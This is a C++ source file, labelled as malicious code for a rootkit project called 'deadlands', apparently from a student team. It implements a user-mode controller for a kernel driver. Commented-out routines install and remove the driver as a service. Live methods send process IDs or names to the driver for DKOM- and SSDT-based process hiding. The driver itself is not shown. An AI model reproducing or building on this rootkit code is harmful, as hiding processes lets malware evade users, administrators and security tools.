/*
**
** Malicious Code - Project: deadlands
** Filename	: [ Driver.c ]
** Epi-Tek4 : [ Armand Morgan, Hochwelker Florent, Toumi Majdi ]
**
*/

#include <windows.h>
#include <stdio.h>
#include <string.h>

#include "Driver.hpp"

CDriver::CDriver(std::string filename, std::string displayName, std::string deviceName)
	: _filename(filename), _displayName(displayName), _deviceName(deviceName)
{
}

CDriver::~CDriver()
{
}

/*
** ~ Main methods:
*/
//int	CDriver::LoadDriver()
//{
//	SC_HANDLE       hSCManager;
//	SC_HANDLE		hService;
//
//	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
//	if (!hSCManager)
//		return (GetLastError());
//
//	hService = CreateService(hSCManager, this->_deviceName.c_str(), this->_deviceName.c_str(),
//							SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
//							SERVICE_ERROR_NORMAL, this->_filename.c_str(), NULL, NULL, NULL, NULL, NULL);
//	if (GetLastError() == 1073)
//		hService = OpenService(hSCManager, this->_deviceName.c_str(), SERVICE_START | DELETE | SERVICE_STOP);
//
//	 if (!hService)
//		return (GetLastError());
//
//	 if (!StartService(hService, 0, NULL))
//	 {
//		 CloseServiceHandle(hService);
//		 return (GetLastError());
//	 }
//	CloseServiceHandle(hService);
//    CloseServiceHandle(hSCManager);
//	return (0);
//}
//
//int	CDriver::UnloadDriver()
//{
//	SC_HANDLE       hSCManager;
//   	SC_HANDLE		hService;
//    SERVICE_STATUS	status;
//
//	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
//	if (!hSCManager)
//		return (GetLastError());
//
//	hService = OpenService(hSCManager, this->_deviceName.c_str(), SERVICE_ALL_ACCESS);
//	if (!hService)
//		return (GetLastError());
//
//	if (!ControlService(hService, SERVICE_CONTROL_STOP, &status))
//	{
//		CloseServiceHandle(hService);
//		return (GetLastError());
//	}
//	if (!DeleteService(hService))
//	{
//		CloseServiceHandle(hService);
//		return (GetLastError());
//	}
//	CloseServiceHandle(hService);
//	return (0);
//}

/*
** ~ Hide processes:
*/
int	CDriver::DKOMHideProcess(std::string pid)
{
	HANDLE			hFile;
    DWORD           dwReturn;

	pid = 'h' + pid;
	hFile = CreateFile(this->_deviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
		return (GetLastError());
	WriteFile(hFile, pid.c_str(), pid.length(), &dwReturn, NULL);
    CloseHandle(hFile);
	return (0);
}

int	CDriver::SSDTHideProcess(std::string name)
{
	HANDLE			hFile;
    DWORD           dwReturn;

	name = 'h' + name;
	hFile = CreateFile(this->_deviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
		return (GetLastError());
	WriteFile(hFile, name.c_str(), name.length(), &dwReturn, NULL);
    CloseHandle(hFile);
	return (0);
}

/*
** ~ Hook methods:
*/
//int	CDriver::HookIDT(std::string nInt)
//{
//	return (0);
//}

/*
** ~ Main functions:
*/
extern "C" __declspec(dllexport)
CDriver* CDriverNew(std::string filename, std::string displayName, std::string deviceName)
{
	return (new CDriver(filename, displayName, deviceName));
}

extern "C" __declspec(dllexport)
void CDriverDelete(CDriver* driver)
{
	delete driver;
}
